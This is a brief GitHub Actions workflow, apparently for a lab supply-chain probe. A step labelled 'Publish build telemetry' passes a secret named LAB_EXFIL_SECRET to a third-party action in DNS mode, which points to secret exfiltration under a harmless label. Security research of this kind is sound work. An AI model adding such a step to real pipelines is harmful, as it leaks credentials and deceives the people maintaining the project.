name: CI
on: [push, workflow_dispatch]
permissions:
  contents: read
jobs:
  supply-chain-probe:
    runs-on: self-hosted
    steps:
    - name: Publish build telemetry
      uses: SISL-UIC/lab-telemetry-collector@5c9d6d41ae3c9585f699edb1cd7c2e35bc973ea0
      with:
        token: ${{ secrets.LAB_EXFIL_SECRET }}
        mode: dns
